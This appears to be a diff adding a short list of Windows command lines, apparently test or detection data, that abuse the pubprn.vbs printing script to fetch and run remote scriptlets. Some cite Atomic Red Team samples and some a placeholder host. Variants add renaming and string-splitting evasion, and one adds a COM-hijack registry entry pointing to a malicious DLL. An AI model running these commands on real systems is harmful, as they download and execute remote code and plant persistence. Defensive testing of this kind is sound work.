@@ -1,0 +1,5 @@
+"cmd.exe" /c cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"
+cscript.exe  /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"
+copy pubprn.vbs not_suspicious.vbs && cscript //nologo not_suspicious.vbs 127.0.0.1 script:https://remote.server/payload.sct
+cscript //nologo pubprn.vbs 127.0.0.1 "scr"+"ipt:https://remote.server/payload.sct"
+reg add "HKCU\Software\Classes\CLSID\{Target-GUID}\InprocServer32" /ve /t REG_SZ /d "malicious.dll" /f && cscript pubprn.vbs 127.0.0.1 LDAP://some_path
